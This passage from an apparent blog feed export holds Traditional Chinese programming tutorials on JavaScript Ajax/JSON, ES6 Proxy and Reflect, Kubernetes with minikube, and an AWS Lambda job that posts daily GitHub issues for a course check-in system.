可以完成不刷頁局部更新應用，使用者體驗較好。不過要小心回調地獄（callback hell）


簡易 Ajax 實作// 若需要支援跨瀏覽器，還需要額外檢驗if (typeof XMLHttpRequest != &#x27;undefined&#x27;) &#123;    // 一般使用 XMLHttpRequest 物件    const xhr = new XMLHttpRequest();    const REQUEST_URL = &#x27;http://163.29.157.32:8080/dataset/6a3e862a-e1cb-4e44-b989-d35609559463/resource/f4a75ba9-7721-4363-884d-c3820b0b917c/download/393625397fc043188a3f8237c1da1c6f.json&#x27;;    // 監聽是否完成    xhr.onreadystatechange = function() &#123;        if (xhr.readyState === XMLHttpRequest.DONE) &#123;            console.log(xhr.responseText);        &#125;    &#125;        xhr.open(&#x27;GET&#x27;, REQUEST_URL);    xhr.send();&#125; 

JSON 基礎概念
JSON（JavaScript Object Notation）是一種由Douglas Crockford 構想設計、輕量級的資料交換語言，以文字為基礎，且易於讓人閱讀

JSON 雖然起於 JavaScript，但資料格式與語言無關，目前很多程式語言都支援 JSON 格式資料的生成和解析

JSON 的官方 MIME 類型是 application/json，其副檔名是 .json

基本格式 &#123; &quot;key&quot;: &quot;value&quot; &#125;、&#123; &quot;key&quot;: [&quot;value1&quot;, &quot;value2&quot;] &#125;



JSON 長這樣&#123;     &quot;name&quot;: &quot;John Smith&quot;,     &quot;address&quot;:      &#123;         &quot;streetAddress&quot;: &quot;21 2nd Street&quot;,         &quot;city&quot;: &quot;New York&quot;,         &quot;state&quot;: &quot;NY&quot;,         &quot;postalCode&quot;: &quot;10021&quot;     &#125;,     &quot;phoneNumber&quot;:      [         &#123;           &quot;type&quot;: &quot;home&quot;,           &quot;number&quot;: &quot;212 555-1234&quot;         &#125;,         &#123;           &quot;type&quot;: &quot;fax&quot;,           &quot;number&quot;: &quot;646 555-4567&quot;         &#125;     ] &#125;

總結以上介紹了新手上路 JavaScript 入門核心基礎概念，大家可以善用 JSBin 實際動手操作，並參考 MDN 或 W3CSchool 的案例會更清楚整體觀念喔！
延伸閱讀
用十分鐘瞭解 陳鍾誠的程式設計課 (採用JavaScript + C的原因)
You-Dont-Know-JS
JavaScript與前端程式設計入門自學參考
JavaScript Garden  
JavaScript核心
[稀土掘金日报] JavaScript 开发者必备的资源合集
專為中學生寫的 JavaScript 程式書 
nzakas&#x2F;computer-science-in-javascript
重新介紹 JavaScript

（image via mpr、mahmoudzalt）
關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>JavaScript</tag>
        <tag>ECMAScript2015</tag>
        <tag>ES6</tag>
        <tag>Front End</tag>
        <tag>Front End Development Environment</tag>
      </tags>
  </entry>
  <entry>
    <title>一起來了解 Javascript 中的 Proxy 與 Reflect</title>
    <url>/2018/05/27/js-proxy-reflect/</url>
    <content><![CDATA[前言在眾多 ES6 提供的新功能上，Proxy 與 Reflect 算是最少被提及的，主要原因我想還是因為瀏覽器的支援度較低，不過在我前陣子看到 Frameworkless JavaScript Part 3: One-Way Data Binding 這篇文章時（好文推薦！很有趣），特意去查了一下才發現目前支援度已經越來越好：


常用的瀏覽器幾乎都支援，我想也是可以來好好了解一下這兩個神奇的物件了！
最後有個參考該篇文章實作的 Todo app 範例，如果懶得看介紹的可以先 跳下去 玩玩，但若是對 Proxy 與 Reflect 不了解的人還是建議先看一下。
Proxy
Proxy 物件被使用於定義基本操作的自定行為（例如：尋找屬性、賦值、列舉、函式調用等等）。 - MDN

不知道為什麼唸起來有點饒口，但基本上跟其字面意思相同，就是代理（代為管理）物件行為。
Proxy 是一個函式物件（可被建構），他提供一個機會讓你能介入一般物件的基本操作行為，像是在你 assign 一個值給某個物件時，可以透過 Proxy 先進行一些 validation 等等，藉此讓使用被代理過後的物件之開發者可以專注在其他核心功能上。
咦？聽起來很像許多 framework 或 helper library 會做的事情？有趣！讓我們繼續看下去。
使用方法如下：
const proxyObj = new Proxy(target, handler);

target 就是你想要代理的對象；而 handler 則是一個物件，其中定義了所有你想替 target 代為管理的操作定義，包含了：

construct(target, args) - 代理 Object 的 new operator

get(target, prop, receiver) - 代理 Object getting properties 時的行為

set(target, prop, value, receiver) - 代理 Object setting properties 時的行為

apply(target, object, args) - 代理 function call，像是 f.apply()

has(target, prop) - 代理 in operator

defineProperty(target, propKey, propDesc) - 代理 Object.defineProperty.

deleteProperty(target, prop) - 代理 delete operator

getOwnPropertyDescriptor(target, prop) - 代理 Object.getOwnPropertyDescriptor.

getPrototypeOf(target) - 代理 Object.getPrototypeOf.

setPrototypeOf(target, proto) - 代理 Object.setPrototypeOf.

ownKeys(target) - 代理 Object.getOwnPropertyNames 與 Object.getOwnPropertySymbols.

isExtensible(target) - 代理 Object.isExtensible.

preventExtensions(target) - 代理 Object.preventExtensions.


handler object 所包含的 method 定義可以從 MDN 看到更多範例與描述。
說了這麼多，我們到底能拿 Proxy 來做什麼呢？直接來點範例吧！直觀的私有變數以往在 Javascript 中，我們可能需要透過 closure 來實現物件的私有變數，像是：
const FooBar = function() &#123;  this.closeTime = &#x27;never&#x27;;  this.setSecretDrink = (secret) =&gt; &#123; secretDrink = secret; &#125;  this.getSecretDrink = () =&gt; &#123; return secretDrink; &#125;&#125;const fooBar = new FooBar();fooBar.setSecretDrink(&#x27;Jäger Bom&#x27;);console.log(fooBar.getSecretDrink()); // &#x27;Jäger Bom&#x27;console.log(fooBar.closeTime); // neverconsole.log(fooBar.secretDrink); // undefined

但透過 Proxy，我們可以很直觀地在一個 Object 內達成類似效果：
let FooBar = &#123;  _secretDrink: &#x27;Jäger Bom&#x27;,  closeTime: &#x27;never&#x27;&#125;;FooBarProxy = new Proxy(FooBar, &#123;  get: function(target, prop) &#123;    // 以底線開頭的作為私有變數    if (prop.startsWith(&#x27;_&#x27;)) &#123;      console.log(&#x27;不能存取私有變數！&#x27;);      return false;    &#125;    return target[prop]; // 非私有變數，那就回傳原物件的原屬性值  &#125;,  set: function(target, prop, value) &#123;    if (prop.startsWith(&#x27;_&#x27;)) &#123;      console.log(&#x27;不能修改私有變數！&#x27;);      return false;    &#125;    target[prop] = value;  &#125;,  has: function(target, prop) &#123;    return prop.startsWith(&#x27;_&#x27;) ? false : (prop in target);  &#125;&#125;);FooBarProxy._secretDrink; // 不能存取私有變數！console.log(FooBarProxy.closeTime); // neverFooBarProxy._secretDrink = &#x27;Cola&#x27;; // 不能修改私有變數！console.log(&#x27;_secretDrink&#x27; in FooBarProxy); // falseconsole.log(&#x27;closeTime&#x27; in FooBarProxy); // true

眼尖一點的讀者可能會發現，這邊 handler 裡面的 get、set 好像跟上面定義中的參數不同，少了 receiver 這個參數？
沒錯，這個神奇的第三個參數其實是指向你產生的 Proxy 實例，以上面例子來看就是 FooBarProxy 本身，由於範例中用不到，所以不宣告也沒關係，不過晚點在 Reflect 的介紹會再度提起。
另外，若是沒有被你代理到的操作，則會直接 fallback 回原始 target 物件的操作上。
在設置物件屬性前進行 Validation延續剛剛的例子，我們的 FooBar 除了秘密飲料外，也需要紀錄一下基本資訊，像是電話、地址等等，這時候 Proxy 就能為我們帶來另一個好處：驗證屬性值：
let FooBar = &#123;  _secretDrink: &#x27;Jäger Bom&#x27;,  closeTime: &#x27;never&#x27;,  phoneNumber: &#x27;02-2849-2839&#x27;&#125;;FooBar = new Proxy(FooBar, &#123;  set: function(target, prop, value) &#123;    if (prop === &#x27;phoneNumber&#x27;) &#123;      // phone number validation      var re = /^\(?\d&#123;2&#125;\)?[\s\-]?\d&#123;4&#125;\-?\d&#123;4&#125;$/;      if (!re.test(value)) &#123;        throw Error(`Cannot set $&#123;prop&#125; to $&#123;value&#125;. Wrong format. Should be xx-xxxx-xxxx`);      &#125;    &#125;    target[prop] = value;  &#125;,  //..&#125;);


只要你設置的 phoneNumber 不符合 regex 的規則，就會拋出一個 Error 告訴開發者，此物件的 phoneNumber 屬性值是有固定 format 的。
當然，javascript 充滿彈性，你也可以有彈性一點的寫法，把 validator 抽離出來：
var BarValidator = &#123;  _secretDrink: function (value) &#123;    if (value === &#x27;cola&#x27;) &#123;      throw Error(&#x27;lame...&#x27;);    &#125;  &#125;,  phoneNumber: function(value) &#123;    var re = /^\(?\d&#123;2&#125;\)?[\s\-]?\d&#123;4&#125;\-?\d&#123;4&#125;$/;    if (!re.test(value)) &#123;      throw Error(`Cannot set phoneNumber to $&#123;value&#125;. Wrong format. Should be xx-xxxx-xxxx`);    &#125;  &#125;&#125;;FooBar = new Proxy(FooBar, &#123;  set: function(target, prop, value) &#123;    BarValidator[prop](value);    target[prop] = value;  &#125;,  //..&#125;);

用來設定屬性預設值// 實際上沒有這個屬性console.log(FooBar.revenue); // undefined// 但經過 Proxy 後FooBar = new Proxy(FooBar, &#123;  get: function(target, prop, value) &#123;    if(prop === &#x27;revenue&#x27;) &#123;      return &#x27;None of your business&#x27;;    &#125;    return target[prop];  &#125;,  //..&#125;);// 可以讀取到我們設定的預設值console.log(FooBar.revenue); // &#x27;None of your business&#x27;

複寫原有物件，讓測試更加順利（mock object）寫測試的時候很常會需要 mock object，像是 function 中若有讀取 document.location.href 的部分，在你開發機上基本上都會是 localhost，這時候就會需要把這個值 mock 掉。
這時我們就可以將 document.location 委託給 proxy 代理：
const mockDocument = &#123;  location: new Proxy(document.location, &#123;      get: function(target, prop) &#123;          if (prop == &quot;href&quot;)              return &quot;your-website-com&quot;;          return target[prop];      &#125;  &#125;)&#125;;console.log(&quot;location href: &quot;, mockLocation.location.href); // https://blog.arvinh.info

看到這邊想必很多人都會想到，我們可以實作 Observe function！function observe(o, callback) &#123;  return new Proxy(o, &#123;    set(target, property, value) &#123;      callback(property, value);      target[property] = value;    &#125;,  &#125;);&#125;const FooBar = &#123; open: false &#125;;const FooBarObserver = observe(FooBar, (property, value) =&gt; &#123;  property === &#x27;open&#x27; &amp;&amp; value ? alert(&#x27;FooBar is open!!!&#x27;) : console.log(&#x27;keep waiting&#x27;);&#125;);FooBarObserver.open = true;

不是什麼都可以被代理的不知道大家會不會有個疑問，難道所有物件都能被 proxy 代理嗎？有沒有辦法限制我的某個物件就是不希望被他人代理？
當然有！
如果你的物件擁有 configurable: false 與 writable: false 的屬性，那該物件就無法被 proxy 代理：
const target = Object.defineProperties(&#123;&#125;, &#123;  FooBar: &#123;    writable: false,    configurable: false  &#125;,&#125;);const handler = &#123;  get(target, propKey) &#123;    return &#x27;???&#x27;;  &#125;&#125;;const proxy = new Proxy(target, handler);proxy.FooBar// Uncaught TypeError: &#x27;get&#x27; on proxy: property &#x27;FooBar&#x27; is a read-only and non-configurable data property on the proxy target but the proxy did not return its actual value (expected &#x27;undefined&#x27; but got &#x27;???&#x27;)

小結論這邊我只列了幾個我覺得比較能凸顯 Proxy 用途的範例，而其他 handler 可以介入的操作如果大家也想了解並看看例子的話，阮一峰的 ECMAScript 6 入門 中有針對每個操作給予例子做解析，可以參考。
Reflect接著我們來看看 Reflect。Reflect 不能建構實例，就像 Math 一樣，單純包含了一系列的靜態方法。
Reflect 與 Proxy 的完美搭配網路上許多文章都說 Reflect 是因應 Proxy 才增加的規範，最明確的連結是，Reflect 所定義的靜態方法包含了 Proxy Handler 能處理的所有代理操作，但他提供的是呼叫原始物件的操作，舉例來說：
Reflect.get(target, name); 效果等同於 target[name];
所以我們在 Proxy 中，如果需要 target 物件的預設操作，使用 Reflect 會更合理更清楚：
const loggedObj = new Proxy(obj, &#123;  get: function(target, name) &#123;    console.log(&quot;get&quot;, target, name);    return Reflect.get(target, name);  &#125;&#125;);

主要的理由在於，Reflect 讓我們對物件的操作可以用函數來處理例如在判斷物件有無特定屬性，或是刪除物件屬性時，以往我們會這樣做：
&#x27;_secretDrink&#x27; in FooBar;delete Object._secretDrink;

有了 Reflect 我們可以這樣做：
Reflect.has(FooBar, &#x27;_secretDrink&#x27;);Reflect.deleteProperty(FooBar, &#x27;_secretDrink&#x27;);

因此，在 Proxy 中，比起使用 delete target[name], Reflect.deleteProperty 更能保持一制性：
const loggedObj = new Proxy(obj, &#123;  deleteProperty: function(target, name) &#123;    // instead of `delete target[name]...    return Reflect.deleteProperty(target, name);  &#125;&#125;);

控制被 Proxy 代理的函數之 this 參考對象這個例子比較難懂，但這是說明為何 Reflect 是因應 Proxy 而生的好例子(source)：
const target = &#123;    get foo() &#123;        return this.bar;    &#125;,    bar: 3&#125;;const handler = &#123;    get(target, propertyKey, receiver) &#123;        if (propertyKey === &#x27;bar&#x27;) return 2;        console.log(&#x27;Reflect.get &#x27;, Reflect.get(target, propertyKey, receiver)); // this in foo getter references Proxy instance; logs 2        console.log(&#x27;target[propertyKey] &#x27;, target[propertyKey]); // this in foo getter references &quot;target&quot; - logs 3    &#125;&#125;;const obj = new Proxy(target, handler);console.log(obj.bar);// 2obj.foo;// Reflect.get  2// target[propertyKey]  3
JS Bin on jsbin.com
假設你的 object target 有一個 getter 函數 foo()，現在你透過 Proxy 代理 get 函數，當今天你呼叫 obj.bar 時，會印出 2，因為 Proxy handler 攔截並代理了原始 target 物件的 get 函數；接著，若你呼叫 obj.foo，會出現兩個結果: Reflect.get  2 與 target[propertyKey]  3。
為什麼？
這是因為只有透過 Reflect.get() 的第三個參數 receiver，將指向 Proxy 本身的實例傳進去原始物件的 get 呼叫，才能夠真的呼叫到 Proxy.get。
若是直接透過 target[&#39;foo&#39;]，則原本在 foo 中的 this，就會指向原始的 target 本身，而不會觸發 Proxy 的 get。
這邊概念真的比較難懂，若我有任何錯誤地方歡迎指正，我相信大家多看幾次範例後都能悟道的。
除了與 Proxy 匹配的優勢外，Reflect 還帶來了一些好處（source: Benefits of ES6 Reflect API, Harmony-reflect)：
更優雅、更好用的回傳值以往使用 Object.defineProperty(obj, name, desc); 時，若成功，會回傳 obj，失敗則有可能會拋出 Error。而使用 Reflect.defineProperty(obj, name, desc) 的話，則會回傳 boolean 值，讓失敗或成功的結果有統一的格式。

更可靠的 apply在 es5 時，大家都很習慣透過 f.apply(obj, args) 的方式來 apply 函數到物件上頭，但很有可能在某些情況下，f.apply 被串改了，這時候就會有不預期的結果。
Senior 一點的會知道可以利用 Function.prototype.apply.call(f, obj, args) 來呼叫，至少 prototype 不會騙你，但這種方式總是不夠優雅。
現在有了 Reflect 後，就不需要擔心這種事情，透過 Reflact.apply(obj, args) 就能輕鬆達到一樣效果。
接受可變參數的 Constructor這個優點只有跟 ES5 比較時才有優勢。主要是讓你能透過：const obj = Reflect.construct(FooBar, args) 來在建構物件實例時，傳遞可變參數；若是在 ES5 的世界，只有 FooBar.apply 或 FooBar.call 能夠接受變動參數，但是在 new 物件實例時，並沒有 apply 或 call 可以使用。
而現在透過 ES6 的 spread syntax，我們可以在建構物件實例時，直接傳遞可變參數：const obj = new FooBar(...args)。


最終範例：利用 Proxy 與 Reflect 完成 one way data binding在了解完 Proxy 與 Reflect 的基本使用方式後，想分享一個很有趣的應用，也就是我開頭提到，激發我研究 Proxy 的範例：frameworkless js one way data binding.
結合先前提過的 Observe function，來實作一個簡單 Todo App：
See the Pen Oneway-data-binding-js-proxy-reflect by Arvin (@arvin0731) on CodePen.


基本上是結合了上述介紹的 Proxy 與 Reflect 特性，並融合這篇文章的範例所製作的，如果大家有看完前面的介紹，對於這段 code 應該不難理解。
主要是透過 Proxy 來代理 Object 的 set 與 deleteProperty 操作，讓 Todo list 的變動能夠被代理。
此外，在先前的介紹中，都是以 Object 為主，但 todo app 範例中被 Proxy 代理的是 Array。
最大的差別在於，當你 push 一個新 item 進入 Array 時，set 會被呼叫兩次，一次是新的 item 被塞入陣列時，一次是 Array 的 length property 加一時。所以要特別濾掉 length 更動的那次代理操作。
最後，只要在代理的操作中，想辦法把 DOM 做對應的修改，如同上面程式中的 line 22 ~ line 40，定義一些 render template 的 function 來更新 DOM 即可。


結論Javascript 的變動總是快於瀏覽器支援度，所以常常造成一些新的 Spec 我們不熟悉、不知如何運用，這次的研究學習了不少，而上面的 Todo App 是個簡陋不嚴謹的範例，不過也足以展現 Proxy 與 Reflect 在實際運用上的情境，並帶給我們另一種思考方向，很多時候不用一開始就套用 Framework，透過越來越進步的瀏覽器與 ES 版本，我們也能達到一樣目的。雖然比不上 framework 包山包海的優化，但或許能讓我們更了解實際要解決的問題是什麼，以及解決方法背後的概念。


資料來源
Frameworkless JavaScript Part 3: One-Way Data Binding
MDN Proxy
ES6 之 Proxy 介绍
ECMAScript 6 入门

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>es6</tag>
        <tag>javascript</tag>
        <tag>proxy</tag>
        <tag>reflect</tag>
        <tag>frameworkless</tag>
      </tags>
  </entry>
  <entry>
    <title>Kubernetes 與 minikube 入門教學</title>
    <url>/2018/12/01/kubernetes101-introduction-tutorial/</url>
    <content><![CDATA[ 
前言Kubernetes（又稱 K8s，類似於 i18n&#x2F;l10n，取中間字母的長度的簡寫命名）是一個協助我們自動化部署（automating deployment）、自動擴展（scaling）和管理容器應用程式（containerized applications）的指揮調度（Orchestration）工具。相比於傳統的手動部屬容器應用程式的方式，Kubernetes 主要有幾個好處：

Automated rollouts and rollbacksKubernetes 可以很容易更新容器版本並 rollback 回之前版本

Service Scalability當定義好部屬服務需求，可以很容易因應流量進行 Auto Scaling

Service discovery and load balancing自動分配容器相對應的 IP 位址，透過 Service cluster 達到 load balancing 效果

Self-healing當 Container Application 出現 crash 時，可以根據部屬定義的需求，自動偵測重啟服務


 
Kubernetes 架構簡介Kubernetes cluster 主要可以分為 Master 和 Node 兩部份，Master 負責指揮調度 Node。在 Kubernetes 世界裡，Node 上的 Pod 是運行調度的最小單位，裡面可以放多個 container（一般以有緊密相關的服務為主，同一個 Pod 共享 IP），也可以只有單個 Container，同一個 Pod 的 container 是一起被調度。而 Deployment 為管理 Pod 的 Controller，我們可以視一組 Deployment 為一組應用服務。而 Service 可以固定住我們對外服務的 IP，不會因為 Pod 關閉重啟而喪失原來的 IP 位置。
環境設定
Minikube is a tool that makes it easy to run Kubernetes locally. Minikube runs a single-node Kubernetes cluster inside a VM on your laptop for users looking to try out Kubernetes or develop with it day-to-day

在開始學習跑步之前，我們先學會走路。首先，我們透過 minikube 這個可以在本地端跑 Kubernetes 工作，來在本地端部屬我們的 Kubernetes cluster，感受一下 k8s 的應用。由於 minikube 只提供 signle-node Kubernetes Cluster，本身並不支援 HA (High availability)，所以不推薦在實際應用上運行呦。
在開始操作之前我們先準備好：

virtualbox（可以根據對應作業系統下載對應版本），
接著透過 homebrew 下指令來安裝 minikube（我們這邊會以 macOS 為主，若是其他作業系統可以參考 minikube 官方 repo 教學）

$ brew cask install minikube

安裝好後可以透過以下指令確認版本，同時它也會一起安裝 kubectl 這個 Kubernetes 指令操作工具 kubectl
$ minikube versionminikube version: v0.30.0

創建 cluster接著啟動我們 Kubernetes cluster
$ minikube startStarting local Kubernetes v1.10.0 cluster...Starting VM...Downloading Minikube ISO 170.78 MB / 170.78 MB [============================================] 100.00% 0sGetting VM IP address...Moving files into cluster...Downloading kubelet v1.10.0Downloading kubeadm v1.10.0Finished Downloading kubelet v1.10.0Finished Downloading kubeadm v1.10.0Setting up certs...Connecting to cluster...Setting up kubeconfig...Starting cluster components...Kubectl is now configured to use the cluster.Loading cached images from config file.

若是啟動完成可以透過以下指令觀看 cluster 情況：
$ kubectl cluster-info

查看 minikube 的狀態：
$ minikube statusminikube: Runningcluster: Runningkubectl: Correctly Configured: pointing to minikube-vm at 192.168.99.100

還可以透過圖形化介面來觀看和操作 Kubernetes
$ minikube dashboard

 
部屬應用接著我們來部屬一個簡單範例應用到 Kubernetes。這個應用名稱叫 docker-python-flask-demo，是一個 Dockerize Simple Flask App 。kubectl run 可以讓我們啟動我們的 Pod，–image 後面接的是 docker image 位置和版本，–port 則是 container 對外的 port
$ kubectl run docker-python-flask-demo --image=docker.io/kdchang/docker-python-flask-demo:v1 --port 3000

應該可以看到 docker-python-flask-demo-xxxxxxxx 的 Pod 已經啟動：
$ kubectl get pods

對外公開應用由於 default 情況下 Pod 只允許 cluster 內部訪問，若是要讓外部可以訪問的話可以將容器的 port 對應到 Node 的 Port（Cluster IP 是只能內部訪問，kubectl expose 則是把 deployment expose 成為一個對外 service，type NodePort 可以把 Deployment 透過 Kubernetes Cluster 的 port 讓 Cluster 外部可以訪問）
$ kubectl expose deployment/docker-python-flask-demo --type=&quot;NodePort&quot; --port 3000service/docker-python-flask-demo exposed

看一下 service 列表，發現已經隨機分配一個 port 31862 （注意讀者產生的 port 有可能不一樣）
$ kubectl get servicesNAME                       TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)          AGEdocker-python-flask-demo   NodePort    10.100.20.174    &lt;none&gt;        3000:32743/TCP   2s

$ kubectl service docker-python-flask-demo --urlhttp://192.168.99.100:32743

可以看到 service 將 deployment&#x2F;docker-python-flask-demo 的 port number 3000 與 minikube-vm 上的 port number 32743 做 mapping接著可以使用 minukube service 的指令快速找到 docker-python-flask-demo 的 url，這樣我們就可以在瀏覽器輸入網址看到成果囉：
 
擴充應用由於 default 情況下 deployment 只會有一個副本 replication，我們可以透過以下指令查看副本數：
$ kubectl get deploymentsNAME                       DESIRED   CURRENT   UP-TO-DATE   AVAILABLE   AGEdocker-python-flask-demo   1         1         1            1           23m

設定副本數量為 3：
$ kubectl scale deployments/docker-python-flask-demo --replicas=3deployment.extensions/docker-python-flask-demo scaled

我們可以看到原本的副本數量從 1 變成了 3：
$ kubectl get deploymentsNAME                       DESIRED   CURRENT   UP-TO-DATE   AVAILABLE   AGEdocker-python-flask-demo   3         3         3            3           25m

設定副本數量為 2：
$ kubectl get deploymentsNAME                       DESIRED   CURRENT   UP-TO-DATE   AVAILABLE   AGEdocker-python-flask-demo   2         2         2            2           26m

更新應用若是我們想要更新 container 的版本的話可以下以下指令（也就是說原本 docker image tag v1 版本改進到 v2 版本，我們可以透過更新 docker image 來進行進版）：
$ kubectl set image deployments/docker-python-flask-demo docker-python-flask-demo=docker.io/kdchang/docker-python-flask-demo:v2deployment.extensions/docker-python-flask-demo image updated

此時我們在到瀏覽器重新整理 http://192.168.99.100:32743/，就會發現畫面中的 Flask Dockerized v1 變成了 Flask Dockerized v2！
 
若要回到 v1 版本可以透過 rollout undo 指令來進行：
$ kubectl rollout undo deployments/docker-python-flask-demodeployment.extensions/docker-python-flask-demo

又回到 v1 惹！
 
總結以上簡單透過 minikube 介紹 Kubernetes 的架構和部屬 cluster 和應用在本地端，實際上我們可以透過雲端服務來部屬我們的 Kubernetes 應用，minikube 主要是用在練習和教學使用，不建議使用在生產環境上。目前 Kubernetes 生態系發展非常快速，版本也持續更新。關於 Kubernetes 相關的實際應用，我們下回再繼續討論囉！
關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>container</tag>
        <tag>容器</tag>
        <tag>Kubernetes</tag>
        <tag>minikube</tag>
        <tag>雲端</tag>
        <tag>cloud native</tag>
      </tags>
  </entry>
  <entry>
    <title>AWS Lambda + GitHub API + Google Sheet = 自動化簽到系統</title>
    <url>/2018/09/14/lambda-and-github-api/</url>
    <content><![CDATA[前言這一年間我利用閒暇之餘嘗試進行了幾場教學實驗，希望能透過持續的教學改進自己的教材，從學生的反饋當中得到一些心得。
而在進行這些教學實驗的時候，我常常在想可以透過哪些現成的服務減少我的負擔，畢竟身為工程師嘛，很想把一些瑣碎的事務自動化，長期下來可以節省的時間是很可觀的。
半年前有了第一次嘗試，也在這邊分享了心得：利用 Github Classroom 加 Travis CI 打造改作業系統，有了自動改作業系統以後，確實省下不少麻煩。
這次要來分享的是兩週前用大概一兩天的時間快速實作出來的自動化簽到系統。
為什麼要簽到系統？為了掌握學生的進度以及確保學生是真的有心要持續上課，我在上一次教學實驗時就引進了我在公司裡面每天必做的 Daily Stand-up meeting，每個人快速分享一下自己昨天做了什麼、今天要做什麼以及有沒有任何事情阻止你完成這些任務。
那時候我用的方法是讓每個人在 Slack 的 channel 裡面用固定格式 po 這些東西：

優點是集中在一個地方，很方便觀看，而缺點就是我只能用肉眼看而已，沒辦法記錄下來。意思就是說如果我想要製作一個有哪些學生沒有 po 的表單，我只能一個一個自己填。
上一次時因為學生人數少，而且 po 這個也不是強制的，所以不成問題，但在這一次的教學實驗裡面我引入了淘汰制，在一定期間內如果缺交進度報告太多次是會被淘汰退出課程的。
既然有了這個機制，我就必須要把這些進度報告給記錄起來，要記錄哪些人哪些日子是沒有報告的。如此一來，就必須要有一個更完整的簽到系統才行，我想達成的目的有：

我要可以在 slack channel 裡面看見每個人的進度報告
我要有個地方可以記錄每天每個學生有沒有 po 進度報告（就把這個稱作簽到）

該如何製作這個簽到系統？我的第一個想法就是使用 Google 試算表，畢竟這個東西最方便嘛，橫軸填入每個學生的帳號，縱軸填入每天的日期，如果有報告就給一個記號，沒報告就空白，這樣我就可以很明確地看出簽到紀錄了，成品長得像這樣：

這樣子就完成第二個需求了，剩下來的就是想說如何完成第一個需求。最簡單的方式就是跟之前一樣，讓學生在某個 channel 裡面每天自己 po 就好，然後我寫個程式來串 Slack 的 webhook，接收到資料就寫進 Google 試算表裡面。
這個解決方案看似不錯，可是有個問題是課程用的 workspace 是免費版的，訊息到一定量之後就會被吃掉，就看不到以前的進度報告，我覺得這是有點可惜的，所以這個方案行不通。
接著我就想到另一個更不錯的解決方案：

讓學生在 GitHub 的 Issue 下面留言
留言同步到 Slack channel
串接 GitHub Webhook，同步把紀錄寫到試算表裡面

這樣子的好處就是紀錄可以永久保存，而且還可以分天！可以很容易的就找到某一天所有人的進度報告，這個是直接 po 在 Slack 裡沒辦法做到的。
先給大家看一下成品，成品長得會像這樣：

有了對整個簽到系統的概念以後，接下來我們可以把在技術上要做的事情分成以下三項：

每天要在 GitHub 開一個 Issue，標題是今天的日期
每個 Issue 下的留言要被同步到 Slack
要串接 GitHub Webhook，同步把紀錄寫到試算表裡面

再來就是實作時間了！
1. 每天要在 GitHub 開一個 Issue，標題是今天的日期一看到「每天」這個關鍵字，就知道這是 Cron Job 可以搞定的事情，原本我想在自己的機器上寫個簡單的小程式讓它每天跑，可是我腦海中突然冒出一個關鍵字：AWS Lambda。
如果你還不知道這是什麼，我簡單說一下，這是近年很流行的 Serverless 的概念之一，不是說沒有 Server，而是指說你不用自己去管 Server，你唯一要做的就是把你的 application 寫好，剩下那些跟 Server 跟機器有關的事情你都不用管。
而 AWS Lambda 就是這樣的一個服務，你只要把你的程式碼放上去就好了，剩下的你都不用管，計費方式是程式的執行時間，可能是因為還在推廣期的關係，所以一個月在一定時數以內都不用錢。
如果不用 Lambda，我要自己把東西傳到我的 Server，然後自己設定 Cron Job 來跑，如果主機出了什麼事情還要自己來修，可是我想做的就只是這麼簡單的一件事情而已阿！用 Lambda 可以幫我省掉很多麻煩，絕對是最佳選擇。
確定要放在 Lambda 上之後，就是要按照它的要求把程式碼寫好放上去，其實這要求也很簡單啦，就是把你要執行的 function 用 exports.handler 給 export 出去就好。
下面是寫好的程式碼：
var axios = require(&#x27;axios&#x27;)var moment = require(&#x27;moment&#x27;)  var token = process.env.tokenvar endpoint = &#x27;https://api.github.com/repos/Lidemy/mentor-daily-report/issues?access_token=&#x27; + tokenvar today = moment().format(&#x27;YYYY-MM-DD&#x27;)  var content = [  &#x27;在下面請按照此格式提供本日進度報告：&#x27;,  &#x27;```&#x27;,  &#x27;## 昨天&#x27;,  &#x27;- 寫作業 hw2-1&#x27;,  &#x27;- 練習 JavaScript 迴圈使用&#x27;,  &#x27;## 今天&#x27;,  &#x27;- 研究什麼是 callback&#x27;,  &#x27;- 寫作業 hw2-1（繼續）&#x27;,  &#x27;```&#x27;].join(&#x27;\n&#x27;)  const createIssue = async (event) =&gt; &#123;  try &#123;    const result = await axios.post(endpoint, &#123;      title: &#x27;[進度報告] &#x27; + today,      body: content    &#125;, &#123;      headers: &#123;        &#x27;Accept&#x27;: &#x27;application/vnd.github.v3+json&#x27;      &#125;    &#125;)    return &#x27;success&#x27;  &#125; catch (err) &#123;    return err;  &#125;&#125;  exports.handler = createIssue  

一個非常簡單的程式，一執行就會透過 GitHub API 去 po 一個新的 Issue，標題就是今天的日期。
有一點需要注意的是這邊有用到其他 npm 的 library，應該有方法是可以只傳 package.json 上去，Lambda 就幫你執行 npm install 把那些套件抓下來，但我懶得查了，我就直接把node_modules包進壓縮檔裡面丟上去。
我上一次用 Lambda 大概兩三年前，這個服務才剛推出沒多久，因為好奇所以隨意玩了一下，發現介面很陽春然後很多東西不知道怎麼設定。
事隔多年，這次再看到它的介面真的嚇到我了，進步超級多！
首先是觸發條件這個部分一目瞭然：

因為我是要每天固定執行，在 AWS 上你可以用 CloudWatch 來設定一個排程，要注意的是在 Lambda 上面這個排程的時間會以 UTC 為準，也就是 +0 的時區，所以你如果是寫說每天 00:00 跑，其實就代表說是在台灣的早上 08:00 跑。
我這邊設定的表達式是：5 0 ? * MON-FRI *，在台灣時間平日早上 08:05 都會觸發 Lambda，執行 po issue 的 function。
然後在 Lambda 的介面上如果你的程式碼沒有很大，可以直接編輯，有功能完整的編輯器（我一直覺得很眼熟，後來才想到應該是 Amazon 買了 Cloud9 的關係，以前上 CS50 都用 Cloud9 的 IDE，難怪這麼熟悉）：

最後把環境變數 token 設定好之後就完成了，測試一下發現 Issue 有成功被建立，第一個任務就這樣輕鬆完成了，感謝 Lambda 的努力。
2. 每個 Issue 下的留言要被同步到 Slack這是三個任務當中最簡單的，因為 Slack 本來的優勢就是可以跟很多現成的東西串接，只要在 Slack 上面安裝 GitHub App，就可以用指令來 subscribe 指定的 repo 跟事件。
因為這個實在是太簡單，所以我就沒必要再多介紹了，直接給大家看成果：

